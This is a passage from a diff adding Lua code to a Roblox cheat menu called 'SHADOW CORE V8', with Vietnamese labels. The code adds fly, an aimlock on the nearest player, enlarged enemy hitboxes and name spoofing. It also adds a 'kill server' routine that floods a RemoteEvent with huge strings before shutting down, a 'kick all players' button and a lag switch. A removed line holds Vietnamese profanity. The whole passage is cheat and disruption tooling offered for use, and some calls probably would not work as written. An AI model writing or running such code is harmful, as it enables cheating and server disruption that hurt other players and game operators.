+        Fly.bodyVel = Instance.new("BodyVelocity"); Fly.bodyVel.MaxForce = Vector3.new(1e6,1e6,1e6); Fly.bodyVel.Velocity = Vector3.new(0,0,0); Fly.bodyVel.Parent = root
+        Fly.bodyGyro = Instance.new("BodyGyro"); Fly.bodyGyro.MaxTorque = Vector3.new(1e6,1e6,1e6); Fly.bodyGyro.CFrame = root.CFrame; Fly.bodyGyro.Parent = root
+        hum.PlatformStand = true; Fly.active = true
+        S.R:BindToRenderStep("FlyControl", 0, function()
+            if not Fly.active then return end
+            local cam = S.W.CurrentCamera; local move = Vector3.new(0,0,0)
+            if S.UIS:IsKeyDown(Enum.KeyCode.W) then move = move + cam.CFrame.LookVector end
+            if S.UIS:IsKeyDown(Enum.KeyCode.S) then move = move - cam.CFrame.LookVector end
+            if S.UIS:IsKeyDown(Enum.KeyCode.D) then move = move + cam.CFrame.RightVector end
+            if S.UIS:IsKeyDown(Enum.KeyCode.A) then move = move - cam.CFrame.RightVector end
+            if S.UIS:IsKeyDown(Enum.KeyCode.Space) then move = move + Vector3.new(0,1,0) end
+            if S.UIS:IsKeyDown(Enum.KeyCode.LeftControl) then move = move - Vector3.new(0,1,0) end
+            if move.Magnitude > 0 then move = move.Unit * Settings.FlySpeed end
+            Fly.bodyVel.Velocity = move; Fly.bodyGyro.CFrame = cam.CFrame
+        end)
+    else
+        if Fly.bodyVel then Fly.bodyVel:Destroy() end; if Fly.bodyGyro then Fly.bodyGyro:Destroy() end
+        if hum then hum.PlatformStand = false end; Fly.active = false; S.R:UnbindFromRenderStep("FlyControl")
+    end
+end
+
+-- ==================== AIMLOCK & HITBOX ====================
+local function GetClosestTarget()
+    local closest, minDist = nil, math.huge
+    for _, plr in pairs(S.P:GetPlayers()) do
+        if plr ~= LocalPlayer and plr.Character then
+            local target = Settings.HeadLock and plr.Character:FindFirstChild("Head") or plr.Character:FindFirstChild("HumanoidRootPart")
+            if target then
+                local pos, onScreen = Camera:WorldToViewportPoint(target.Position)
+                if onScreen then
+                    local dist = (Vector2.new(pos.X, pos.Y) - Vector2.new(Camera.ViewportSize.X/2, Camera.ViewportSize.Y/2)).Magnitude
+                    if dist < minDist then minDist, closest = dist, target end
+                end
+            end
+        end
+    end
+    return closest
+end
+local function ExpandHitboxes()
+    for _, plr in pairs(S.P:GetPlayers()) do
+        if plr ~= LocalPlayer and plr.Character then
+            local root = plr.Character:FindFirstChild("HumanoidRootPart")
+            if root then root.Size = Vector3.new(Settings.HitboxSize, Settings.HitboxSize, Settings.HitboxSize); root.Transparency = 0.85; root.CanCollide = false end
+        end
+    end
+end
+
+-- ==================== KILL SERVER ====================
+local killServerActive = false
+local function KillServerOverload()
+    for i = 1, 100 do task.spawn(function()
+        local folder = Instance.new("Folder")
+        for j = 1, 1000 do local p = Instance.new("Part"); p.Parent = folder end
+        folder.Parent = S.W
+        local remote = Instance.new("RemoteEvent"); remote.Name = "Kill"; remote.Parent = S.RS
+        for _ = 1, 5000 do remote:FireServer(string.rep("A", 100000)) end
+    end) end
+    task.wait(3); game:Shutdown()
+end
+local function ActivateKillServer() if killServerActive then return end; killServerActive = true; KillServerOverload() end
+
+-- ==================== KICK ALL PLAYERS ====================
+local function KickAllPlayers()
+    for _, plr in pairs(S.P:GetPlayers()) do
+        if plr ~= LocalPlayer then pcall(function() plr:Kick("Bạn đã bị SHADOW CORE văng khỏi server") end); task.wait(0.05) end
+    end
+end
+
+-- ==================== LAG SWITCH ====================
+local lagSwitchActive = false
+local function ToggleLagSwitch()
+    lagSwitchActive = not lagSwitchActive
+    task.spawn(function()
+        while lagSwitchActive do
+            for i = 1, Settings.LagSwitchIntensity * 50 do
+                local part = Instance.new("Part"); part.Size = Vector3.new(50,1,50); part.Position = Camera.CFrame.Position + Vector3.new(math.random(-300,300), math.random(-50,50), math.random(-300,300))
+                part.Anchored = true; part.Transparency = 1; part.Parent = S.W; game:GetService("Debris"):AddItem(part, 0.05)
+            end
+            task.wait(0.01)
+        end
+    end)
+end
+
+-- ==================== GIAO DIỆN MENU NÂNG CẤP ====================
+local function CreateMainMenu()
+    local gui = Instance.new("ScreenGui"); gui.Name = "ShadowCoreV8"; gui.Parent = S.CG; gui.ResetOnSpawn = false
+    local main = Instance.new("Frame"); main.Size = UDim2.new(0,340,0,620); main.Position = UDim2.new(0,10,0,10)
+    main.BackgroundColor3 = Color3.new(0,0,0); main.BackgroundTransparency = 0.2; main.BorderSizePixel = 2; main.BorderColor3 = Color3.new(1,0,0); main.Parent = gui
+    local title = Instance.new("TextLabel"); title.Size = UDim2.new(1,0,0,30); title.Text = "☠ SHADOW CORE V8.0 FINAL ☠"
+    title.TextColor3 = Color3.new(1,0,0); title.BackgroundTransparency = 1; title.Font = Enum.Font.GothamBold; title.TextSize = 18; title.Parent = main
+
+    local function addBtn(text, y, col, cb)
+        local btn = Instance.new("TextButton"); btn.Size = UDim2.new(0.9,0,0,35); btn.Position = UDim2.new(0.05,0,0,y)
+        btn.Text = text; btn.TextColor3 = Color3.new(1,1,1); btn.BackgroundColor3 = col; btn.BorderSizePixel = 1; btn.Font = Enum.Font.Gotham; btn.TextSize = 13; btn.Parent = main
+        btn.MouseButton1Click:Connect(cb); return btn
+    end
+    local function addSlider(text, y, minV, maxV, step, default, callback)
+        local frame = Instance.new("Frame"); frame.Size = UDim2.new(0.9,0,0,55); frame.Position = UDim2.new(0.05,0,0,y)
+        frame.BackgroundColor3 = Color3.new(30,30,30); frame.BackgroundTransparency = 0.5; frame.Parent = main
+        local label = Instance.new("TextLabel"); label.Size = UDim2.new(1,0,0,20); label.Text = text .. ": " .. default; label.TextColor3 = Color3.new(1,1,1); label.BackgroundTransparency = 1; label.Font = Enum.Font.Gotham; label.TextSize = 12; label.Parent = frame
+        local slider = Instance.new("TextButton"); slider.Size = UDim2.new(1,0,0,25); slider.Position = UDim2.new(0,0,0,22); slider.Text = ""; slider.BackgroundColor3 = Color3.new(100,100,100); slider.BorderSizePixel = 1; slider.Parent = frame
+        local fill = Instance.new("Frame"); fill.Size = UDim2.new((default-minV)/(maxV-minV),0,1,0); fill.BackgroundColor3 = Color3.new(1,0,0); fill.BorderSizePixel = 0; fill.Parent = slider
+        local val = default; local drag = false
+        local function update()
+            fill.Size = UDim2.new((val-minV)/(maxV-minV),0,1,0); label.Text = text .. ": " .. string.format("%.1f", val); callback(val)
+        end
+        slider.InputBegan:Connect(function(inp) if inp.UserInputType == Enum.UserInputType.MouseButton1 then drag = true end end)
+        slider.InputEnded:Connect(function(inp) if inp.UserInputType == Enum.UserInputType.MouseButton1 then drag = false end end)
+        slider.MouseMoved:Connect(function()
+            if drag then
+                local mx = S.UIS:GetMouseLocation().X; local sx = slider.AbsolutePosition.X; local sw = slider.AbsoluteSize.X
+                local ratio = math.clamp((mx - sx) / sw, 0, 1); val = minV + ratio * (maxV - minV); val = math.floor(val / step) * step; update()
+            end
+        end)
+        update()
+        return {set=function(v) val = v; update() end}
+    end
+
+    -- Fix Lag cấp 1-5
+    addBtn("🔧 CẤP 1 (Giảm hiệu ứng)", 40, Color3.new(0,0.3,0), function() LagFix.Apply(1) end)
+    addBtn("🔧 CẤP 2 (Xóa hiệu ứng mạnh)", 80, Color3.new(0,0.4,0), function() LagFix.Apply(2) end)
+    addBtn("🔧 CẤP 3 (Xóa hiệu ứng siêu mạnh)", 120, Color3.new(0,0.5,0), function() LagFix.Apply(3) end)
+    addBtn("🔧 CẤP 4 (+ Xóa màu đảo)", 160, Color3.new(0,0.6,0), function() LagFix.Apply(4) end)
+    addBtn("🔧 CẤP 5 (Người thành bóng)", 200, Color3.new(0,0.7,0), function() LagFix.Apply(5) end)
+
+    -- 3 Sliders
+    addSlider("🚶 TỐC ĐỘ CHẠY", 250, 16, 300, 1, Settings.WalkSpeed, function(v) Settings.WalkSpeed = v; SetWalkSpeed(v) end)
+    addSlider("🦘 ĐỘ CAO NHẢY", 315, 50, 500, 5, Settings.JumpPower, function(v) Settings.JumpPower = v; SetJumpPower(v) end)
+    addSlider("✈️ TỐC ĐỘ BAY", 380, 50, 500, 5, Settings.FlySpeed, function(v) Settings.FlySpeed = v end)
+
+    -- Các nút chức năng
+    addBtn("🔄 BẬT/TẮT FLY", 445, Color3.new(0,0.4,0.4), function() Settings.FlyEnabled = not Settings.FlyEnabled; ToggleFly() end)
+    addBtn("💀 KILL SERVER (TỰ SHUTDOWN)", 490, Color3.new(0.5,0,0), function() ActivateKillServer() end)
+    addBtn("👢 KICK TẤT CẢ NGƯỜI CHƠI", 535, Color3.new(0.7,0.2,0), function() KickAllPlayers() end)
+    addBtn("🐌 LAG SWITCH (BẬT/TẮT)", 580, Color3.new(0.4,0.4,0), function() ToggleLagSwitch() end)
+end
+
+-- ==================== VÒNG LẶP CHÍNH TỰ ĐỘNG ====================
+task.spawn(function()
+    while true do
+        if Settings.AimlockEnabled then
+            local target = GetClosestTarget()
+            if target then
+                local targetCF = CFrame.lookAt(Camera.CFrame.Position, target.Position)
+                Camera.CFrame = Camera.CFrame:Lerp(targetCF, Settings.Smoothness)
+            end
+        end
+        if Settings.HitboxEnabled then ExpandHitboxes() end
+        if Settings.LagFixLevel >= 1 then LagFix.Apply(Settings.LagFixLevel) end
+        task.wait(0.5)
+    end
 end)
 
-Rayfield:Notify({Title = "dm lu lon", Content = "chan bố m đê", Duration = 5})
+-- ==================== KHỞI TẠO TOÀN BỘ ====================
+LagFix.Apply(Settings.LagFixLevel)
+if Settings.ShowFPS then CreateFPS() end
+CreateMainMenu()
+SetWalkSpeed(Settings.WalkSpeed)
+SetJumpPower(Settings.JumpPower)
+if Settings.AnonymousMode then
+    pcall(function() LocalPlayer.Name = Settings.FakeName; LocalPlayer.DisplayName = Settings.FakeName end)
+end
